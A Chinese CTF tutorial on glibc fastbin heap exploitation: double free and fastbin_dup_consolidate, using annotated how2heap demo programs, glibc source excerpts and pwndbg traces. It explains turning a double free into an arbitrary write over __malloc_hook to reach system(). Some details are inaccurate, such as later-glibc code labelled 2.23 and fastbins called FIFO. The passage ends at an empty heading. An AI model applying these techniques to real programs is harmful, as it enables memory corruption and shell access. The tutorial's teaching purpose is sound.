# Fastbin Attack

**本篇是基于github上面how2heap项目以及glibc源代码撰写的**

### fastbin double free 
* **什么是double free** 
也就是一个堆块在已经释放过一次的前提下，再次被错误的释放
* **为什么double free可以被利用**
首先我们来看一下linux中堆块释放的机制：
因为在Linux的堆管理器ptmalloc2上，被释放的堆块都会依据其大小放置在对应的链表（我们称之为bins）上面。
fastbin是其中一种链表的数组，他总共有从存放`2*SIZE_SZ`大小的堆块的链表到`20*SIZE_SZ`大小的堆块(这里说的都是用户可以使用的空间大小，即数据空间大小)，总共有10个bins。
每个链表都是一个单链表，当堆块被释放时并且其大小符合fastbins里某一个bin的大小，则该堆块的指针会被放到对应fastbin的头节点的next指针上面，当前堆块的next指针（用户区的第一个SIZE_SZ字节）指向原来头节点next指针指向的位置。
如果我们可以double free，则会导致对应堆块的指针在这条单链表上面出现两次。
接下来，我们先把这个堆块chunk1分配回来，把我们可以任意写的用户区的第一个SIZE_SZ大小字节改成我们想要利用的地址（比如`__malloc_hook` `__free_hook`之前的某个地址）
我们再接着malloc同样大小的堆块，直到这个fastbin的头节点next指针再次指向这个chunk1，这时如果我们再次malloc，chunk1会被分配回来，那他的**next所指向的地址所属的，与当前fastbin大小一致的一段连续空间**，会变成**fastbin的头节点的next指向的位置**，也就是说，**chunk1的next指向的区域**，被当做了**下一次malloc同样大小堆块时要被分配到“堆块”**。
但是我们再返回来看，发现这个next被我们在第一次malloc拿到chunk1的时候已经改成一个target地址了，那我们第二次再拿到这个chunk1的时候，这个指向target地址的指针，便成了当前大小fastbin头节点next指针的值。
我们顺水推舟，再malloc一次同样的大小，顺利就拿到了target地址所在的这片空间，理论上来说你所能控制大小与你的chunk1大小一致，但是实际上没有人能管你到底会怎么“祸害”这片空间了。地址已经被你拿到，原本不可写的数据或者代码段被你这一系列操作变成了系统认为的堆块，现在你就可以任意写这片区域了（比如把`__malloc_hook` `__free_hook`改成`system()`,这样就可以getshell了）

* **上面只是理论，ctf还需要实践，那下面让我们用how2heap上面的一个例子来看看最简单的double free是什么样的吧**
```c
// https://github.com/shellphish/how2heap/glibc-2.23/fastbin_dup.c

/*
下面这是在Linux glibc2.23版本下，展示fastbin double free机制的一个程序，源代码路径我已经标在上面了,大家有兴趣可以clone下来自己去编译运行看看。当然，我下面也会逐关键行讲解。
*/


#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
	// 这里malloc了3个8字节大小的堆，但实际上，在64位环境下（我的机器也是最普遍的机器），最低分配字节其实是16个字节，所以分配到的都是用户区域有0x10字节的堆块。

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);
	// 但是这里你看完肯定会疑惑，为什么a与b，b与c之间，相差了0x20的空间呢？这是因为一个堆块chunk不仅有用户可以使用的数据区域，还有存放chunk基本信息的头部区域（head）。
	// head部分占16个字节，其实就是2*SIZE_SZ个字节（64位SIZE_SZ为8字节）。
	// 第一个8字节存放prev_size，即上一个堆块的大小（如果上一个堆块已被释放的话才有效，否则默认可以用作上一个堆块的用户数据区）。
	// 第2个8字节存放size，但是里面还有map、prev_inuse（最后一位）等标志位。
	// 当你在代码里面写下malloc(8)的时候，系统最终给你返回的这个指针，指向的是用户数据区，即chunk真正的首地址+16字节的位置。
	// head的16字节，加上原本的最小用户数据区大小16字节，就构成了最小的chunk大小32字节，也就是你看到的0x20的空间。

	fprintf(stderr, "Freeing the first one...\n");
	free(a);
	// 这里首先free掉a，让他进入对应的fastbin

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);
	// 这里千万不能再次free(a)，因为写linux源码的人也不是傻瓜，他在堆块释放的时候加了检查。在glibc还在2.23版本的时候，这个检查虽然有，但是比较薄弱。他只会检查当前fastbin的头节点next指向的堆块是否与当前要释放的堆块一致。如果是同一个堆块，则说明你想要再次释放已经释放过的堆块，程序就会崩溃。
	// 但是很显然，既然你检查的是头节点的next指针，那只要我头节点的next指针当前指的不是这个a，不就可以再次释放a了吗

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);
	// 所以我们选择先释放b，让next先指到b上面

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);
	// 这时候再回过头来，把a再释放出去，就没有人会阻拦了哈哈哈

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);
	// 我们再一个一个malloc回来，看看我们double free真的成功没有。发现a指向的还是a，因为a是最后一遍释放的那个。b指向的还是b，因为b是倒数第二个释放的。c指向的是原来的a，这就说明double free成功了。我们原本的a块在同一个fastbin上面出现了两次，只要中间隔了一个b就实现了。

	assert(a == c); // 断言是成功通过的
	return 0;
}
```

* 如果电脑现在不在你身边或者你的环境还没有配置好，那你可以先看我给你运行一遍：
**注意：下面我说的在哪里打断点指的是how2heap源程序里面的行数，不是上面的行数哈。上面我往里面写了太多注释，行都错位了**
1. 先用gdb调试 `$ gdb -q ./glibc_2.23/fastbin_dup`
2. 在第13行处打断点，看一看刚分配的三个堆块在heap上面的什么地址 
```bash
pwndbg> b 13
Breakpoint 2 at 0x555555555245: file glibc_2.23/fastbin_dup.c, line 14.
pwndbg> c
.....此处省略中间gdb的信息,让他运行到第13行位置......
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000 (这是a对应堆块的真正初始地址)
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x555555559020（这是b对应堆块的真正初始地址）
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x555555559040（这是c对应堆块的真正初始地址）
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555559060 （这是主线程剩余未分配堆空间）
Size: 0x20fa0 (with flag bits: 0x20fa1)
```
3. 在第17行打断点，看一下这3个堆块的用户区地址，也就是malloc返回的指针值
```bash
pwndbg> b 17
Breakpoint 3 at 0x5555555552ab: file glibc_2.23/fastbin_dup.c, line 18.
pwndbg> c
Continuing.
1st malloc(8): 0x555555559010 (果真偏移0x10吧)
2nd malloc(8): 0x555555559030
3rd malloc(8): 0x555555559050
```
4. 先释放第一次a，看看fastbin。在第20行打断点,然后用`bins`指令查看当前有被释放堆块的bin状态
```bash
pwndbg> b 20
Breakpoint 4 at 0x5555555552da: file glibc_2.23/fastbin_dup.c, line 21.
pwndbg> c
Continuing.
Freeing the first one...
......
pwndbg> bins
fastbins
0x20: 0x555555559000 ◂— 0  这里可以看到a块被放到这个大小为0x20的fastbin里面了
unsortedbin
empty
smallbins
empty
largebins
empty
```
5. 再释放b，看看fastbin。在26行打断点。
```bash
pwndbg> b 27
Breakpoint 5 at 0x55555555532b: file glibc_2.23/fastbin_dup.c, line 27.
pwndbg> c
Continuing.
If we free 0x555555559010 again, things will crash because 0x555555559010 is at the top of the free list.
So, instead, we'll free 0x555555559030.
......
pwndbg> fastbin
fastbins
0x20: 0x555555559020 —▸ 0x555555559000 ◂— 0 从左向右，是链表增长方向，最左侧是最靠近头节点的位置。也就是说现在b在头节点的next位置上面，a在b的next位置上面
```
6. 再释放a，现在是绕过检查了。在29行打断点。
```bash
pwndbg> b 30
Breakpoint 6 at 0x555555555359: file glibc_2.23/fastbin_dup.c, line 30.
pwndbg> c
Continuing.
Now, we can free 0x555555559010 again, since it's not the head of the free list.
......
pwndbg> fastbin
fastbins
0x20: 0x555555559000 —▸ 0x555555559020 ◂— 0x555555559000 可以发现现在头节点next指针指向的是a了，但是链表末尾还有一个a，这就说明我们的double free构造成功了。接下来就该malloc把他们拿回来进行利用了。
```
7. 把断点打在32和33位置，看看前两个malloc是否是把a和b分配回去（FIFO原则，和栈一样）
```bash
pwndbg> b 32 malloc一次
Breakpoint 7 at 0x555555555398: file glibc_2.23/fastbin_dup.c, line 32.
pwndbg> c
......
pwndbg> fastbin
fastbins
0x20: 0x555555559020 —▸ 0x555555559000 ◂— 0x555555559020 因为a被释放了两次，第二次a被释放进来的时候next指针指向了b，链表上面最右边那个a也就是第一次被释放进来的a的next指针同时被修改成了b，就导致这个fastbin的链表成死循环了，以后malloc只会malloc这两个了，a和b轮流被malloc
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE  相当于还有一个a在fastbin里面呢，所以这里还是显示free chunk
Addr: 0x555555559000
Size: 0x20 (with flag bits: 0x21)  
fd: 0x555555559020

Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559020
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559000

Allocated chunk | PREV_INUSE
Addr: 0x555555559040
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555559060
Size: 0x20fa0 (with flag bits: 0x20fa1)
```

```bash
pwndbg> b 33  malloc第二次
Breakpoint 8 at 0x5555555553a6: file glibc_2.23/fastbin_dup.c, line 33.
pwndbg> c
......
pwndbg> fastbin
fastbins
0x20: 0x555555559000 —▸ 0x555555559020 ◂— 0x555555559000 a又回到了头上，下次分配就可以拿到a了
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559000
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559020

Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559020
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559000

Allocated chunk | PREV_INUSE
Addr: 0x555555559040
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555559060
Size: 0x20fa0 (with flag bits: 0x20fa1)
```
8. 再次malloc，成功重复拿到a。这时候a和c都指向曾经的a
```bash
pwndbg> b 37 再次malloc
Breakpoint 9 at 0x55555555541a: file glibc_2.23/fastbin_dup.c, line 38.
pwndbg> c
Continuing.
1st malloc(8): 0x555555559010 这是原本的a
2nd malloc(8): 0x555555559030 这是原本的b
3rd malloc(8): 0x555555559010 这是还是原本的a
......
pwndbg> fastbin
fastbins
0x20: 0x555555559020 —▸ 0x555555559000 ◂— 0x555555559020 b又回到头上了，a和b会轮流回到头上，只要没有新的块进来
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559000
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559020

Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555559020
Size: 0x20 (with flag bits: 0x21)
fd: 0x555555559000

Allocated chunk | PREV_INUSE
Addr: 0x555555559040
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555559060
Size: 0x20fa0 (with flag bits: 0x20fa1)
```

* **请注意：fastbin double free机制虽然通用，但是在glibc-2.26版本引入tcache结构体之后，必须先把对应的tcachebin填满才能把堆块释放入fastbin。同样的，再malloc回来时，必须先把tcache里面的块分配完才会轮到fastbin**

### fastbin malloc consolidate
* **什么是malloc consolidate**
malloc consolidate是linux堆管理的一个机制，目的是防止大量的碎片化chunk滞留在bins里面，浪费空间。
先看下面的linux源代码：
```c
// glibc-2.23 version
static void malloc_consolidate(mstate av)
{
  mfastbinptr*    fb;                 /* current fastbin being consolidated */
  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */
  mchunkptr       p;                  /* current chunk being consolidated */
  mchunkptr       nextp;              /* next chunk to consolidate */
  mchunkptr       unsorted_bin;       /* bin header */
  mchunkptr       first_unsorted;     /* chunk to link to */

  /* These have same use as in free() */
  mchunkptr       nextchunk;
  INTERNAL_SIZE_T size;
  INTERNAL_SIZE_T nextsize;
  INTERNAL_SIZE_T prevsize;
  int             nextinuse;

  atomic_store_relaxed (&av->have_fastchunks, false);

  unsorted_bin = unsorted_chunks(av); // 拿到unsorted bin头

  /*
    Remove each chunk from fast bin and consolidate it, placing it
    then in unsorted bin. Among other reasons for doing this,
    placing in unsorted bin avoids needing to calculate actual bins
    until malloc is sure that chunks aren't immediately going to be
    reused anyway.
  */

  maxfb = &fastbin (av, NFASTBINS - 1); // 最大的fastbin链表头
  fb = &fastbin (av, 0); // 最小的fastbin链表头
  do {
    p = atomic_exchange_acq (fb, NULL);
    if (p != 0) {
      do {
		{ // 这个部分是存在性和大小检查
		  if (__glibc_unlikely (misaligned_chunk (p)))
		    malloc_printerr ("malloc_consolidate(): "
				     "unaligned fastbin chunk detected");

		  unsigned int idx = fastbin_index (chunksize (p));
		  if ((&fastbin (av, idx)) != fb)
		    malloc_printerr ("malloc_consolidate(): invalid chunk size");
		}

		check_inuse_chunk(av, p);
		nextp = REVEAL_PTR (p->fd);

		/* Slightly streamlined version of consolidation code in free() */
		size = chunksize (p);
		nextchunk = chunk_at_offset(p, size);
		nextsize = chunksize(nextchunk);

		if (!prev_inuse(p)) { // 检查当前chunk的前一个相邻chunk是否在使用，如果是被释放的，执行consolidate操作
		  prevsize = prev_size (p);
		  size += prevsize; // 先增长size
		  p = chunk_at_offset(p, -((long) prevsize)); // 再移动指针
		  if (__glibc_unlikely (chunksize(p) != prevsize))
		    malloc_printerr ("corrupted size vs. prev_size in fastbins");
		  unlink_chunk (av, p); // 将原本的chunk脱对应bin链
		}

		if (nextchunk != av->top) { // 如果下一个chunk所在位置不是top chunk
		  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

		  if (!nextinuse) { // 这个chunk如果也是处于释放状态
		    size += nextsize;  // 改变当前chunk的大小
		    unlink_chunk (av, nextchunk); // 直接再将原本的下一个chunk脱对应bin链
		  } else
		    clear_inuse_bit_at_offset(nextchunk, 0);

		  first_unsorted = unsorted_bin->fd;
		  unsorted_bin->fd = p;
		  first_unsorted->bk = p; // 将合并之后的chunk插入unsorted bin链表

		  if (!in_smallbin_range (size)) { // 如果大小为large bins的范围，还需要先初始化large bin 的fdnextsize和bknextsize指针
		    p->fd_nextsize = NULL;
		    p->bk_nextsize = NULL;
		  }

		  set_head(p, size | PREV_INUSE);
		  p->bk = unsorted_bin;
		  p->fd = first_unsorted;
		  set_foot(p, size);
		}

		else { // 如果下一个是top chunk，直接与top chunk合并
		  size += nextsize;
		  set_head(p, size | PREV_INUSE);
		  av->top = p;
		}

      } while ( (p = nextp) != 0); // fastbin里面每个块都进行consolidate

    }
  } while (fb++ != maxfb); // 每个fastbin都进行合并
}
```

* **看完上面malloc consolidate的具体操作，下面来具体解释一下完整触发consolidate操作的流程**
1. 如果当前堆块的分配大小在large bin的范围，系统会先执行malloc_consolidate操作
2. 将fastbin里面能合并的堆块都合并一遍再脱链，脱链之后的chunk会被放到unsorted bin里面等待分配，保证fastbin被清空。
3. 在fastbin上面的chunk，先向低地址的相邻chunk发送合并请求（如果是空闲块，则合并；不空闲则无视）。再向高地址的相邻块发送合并请求。但是这里会出现top chunk的问题，所以要先进行判断：
	如果相邻高地址位置是top chunk，则直接与top chunk合并，top chunk的指针上移；
	如果相邻高地址是空闲的块，则可以直接合并（不空闲则无视）

* **那如何利用这个机制实现fastbin attack呢，比如通过double free，拿到某些可以利用的地址**
那我们直接来看下面这个how2heap的例子，这里是拿到了top chunk的地址，实现了UAF，并且之后就可以编辑top chunk了
```c
// how2heap/glibc_2.23/fastbin_dup_consolidate.c
// malloc consolidate 源码位置： https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4122

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n");

	void* p1 = calloc(1,0x40); // 先malloc一个0x40的块

	printf("Allocate a fastbin chunk p1=%p \n", p1);
  	printf("Freeing p1 will add it to the fastbin.\n\n");
  	free(p1);  // 把它释放了，他应该会进入fastbin

  	void* p3 = malloc(0x400); // 分配一个large bin大小的chunk，这会触发系统执行malloc consolidate，那刚才放入p1的fastbin就会被清空，p1会与先与top chunk合并，然后再重新切割出来一个0x410的块分配给用户。

	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
	printf("a chunk with chunk size 0x410. p3=%p\n", p3);

	printf("\nmalloc_consolidate will merge the fast chunk p1 with top.\n");
	printf("p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n");

	assert(p1 == p3); // 但是p1和p3指针都会指向最原始的p1那个地址

  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n");
	free(p1); // vulnerability // 由于p1和p3都指向的是那块地址，所以free(p1)等同于free(p3),这个chunk就被放到unsorted bin上面了。

	printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");
	printf("chunk got consolidated with it. We have thus achieved UAF!\n");

	printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");
	printf("p3 and p1 will still be pointing to it.\n");
	void *p4 = malloc(0x400); // 这个块先与top chunk进行合并，再从top chunk上面切割下来一个0x410大小的块分配给用户。p1 p3 p4都指向的是同一个地址。

	assert(p4 == p3); 

	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
	printf("and both point to the same large-sized chunk. p3=%p p4=%p\n", p3, p4);
	printf("We have achieved duplication!\n\n");
	return 0;
}
```

要看懂上面的操作在干什么，以及为什么会触发malloc consolidate，我们还需要再次回到glibc源码上面，这回我们看分配阶段，也就是_int_malloc的源码
```c
// malloc.c 3437:
 /*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */

  else // 如果当前分配大小在large bin范围内
    {
      idx = largebin_index (nb);
      if (have_fastchunks (av))  // fastbin里面有chunk
        malloc_consolidate (av);  // 进行malloc consolidate
    }
```
这也就解释了为什么我们在`malloc(0x400)`的时候，会先进行malloc consolidate，使得fastbin里面的空块被与top chunk合并了

* **依旧用gdb来断点调试查看（下面说的断点位置都是github上面源项目里面的行数）**
1. 先calloc一个0x40的堆块
```bash
pwndbg> b 33
Breakpoint 2 at 0x555555555217: file glibc_2.23/fastbin_dup_consolidate.c, line 34.
pwndbg> c
Continuing.
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411) // 至于这个0x400的堆块，不是由用户编写的malloc分配的，而是由于最开始的printf提供了文件IO缓冲区初始化创建的

Allocated chunk | PREV_INUSE
Addr: 0x555555559410
Size: 0x50 (with flag bits: 0x51) // calloc(1,0x40); 

Top chunk | PREV_INUSE
Addr: 0x555555559460
Size: 0x20ba0 (with flag bits: 0x20ba1)
```
2. 再把它free掉，发现他在fastbin上面
```bash
pwndbg> b 37
Breakpoint 3 at 0x55555555524d: file glibc_2.23/fastbin_dup_consolidate.c, line 38.
pwndbg> c
Continuing.
Allocate a fastbin chunk p1=0x555555559420  // 第一个chunk被分配到0x555555559410位置了
Freeing p1 will add it to the fastbin.
pwndbg> fastbin
fastbins
0x50: 0x555555559410 ◂— 0
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411)

Free chunk (fastbins) | PREV_INUSE // 现在他还在fastbin里面
Addr: 0x555555559410
Size: 0x50 (with flag bits: 0x51)
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x555555559460
Size: 0x20ba0 (with flag bits: 0x20ba1)
```
3. 这时候malloc(0x400)，这是一个large bin大小的堆块，会触发malloc consolidate
```bash
pwndbg> b 46
Breakpoint 4 at 0x5555555552b2: file glibc_2.23/fastbin_dup_consolidate.c, line 47.
pwndbg> c
Continuing.
To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)
which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us
a chunk with chunk size 0x410. p3=0x555555559420 可以看到这个块被分配到p1同样的地址了

malloc_consolidate will merge the fast chunk p1 with top.
p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.
pwndbg> fastbin
fastbins
empty
pwndbg> unsortedbin
unsortedbin
empty
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x555555559410
Size: 0x410 (with flag bits: 0x411) // 这里的chunk其实是先合并入top chunk，然后再从top chunk里面分配出来的

Top chunk | PREV_INUSE
Addr: 0x555555559820
Size: 0x207e0 (with flag bits: 0x207e1)
```
4. double free p1, 在free的时候也会consolidate，被合并到top chunk里面
```c
// malloc.c 4049:
/*
      If the chunk borders the current high end of memory,
      consolidate into top
    */

    else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av->top = p;
      check_chunk(av, p);
    }
```
```bash
pwndbg> b 54
Breakpoint 5 at 0x55555555531d: file glibc_2.23/fastbin_dup_consolidate.c, line 55.
pwndbg> c
Continuing.
We will double free p1, which now points to the 0x410 chunk we just allocated (p3).

So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our
chunk got consolidated with it. We have thus achieved UAF!
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE 可见已经被合到top chunk里面了
Addr: 0x555555559410
Size: 0x20bf0 (with flag bits: 0x20bf1) 
```
5. 再malloc(0x400)一下，再次从top chunk上面切下来一个0x410的块，现在p1,p3,p4都指向同一个地址`0x555555559420`了。成功DUP！
```bash
pwndbg> b 64
Breakpoint 7 at 0x5555555553b8: file glibc_2.23/fastbin_dup_consolidate.c, line 64.
pwndbg> c
Continuing.
We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top
p3 and p1 will still be pointing to it.

We now have two pointers (p3 and p4) that haven't been directly freed
and both point to the same large-sized chunk. p3=0x555555559420 p4=0x555555559420
We have achieved duplication!
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x555555559410 还是这个地址
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x555555559820
Size: 0x207e0 (with flag bits: 0x207e1)
```

* **fastbin_dup_consolidate也是一种绕开fastbin double free检查机制的方法。可以将多个指针指向同一块地址，多次利用，并且可以在释放后继续使用**

### fastbin_dup_into_stack
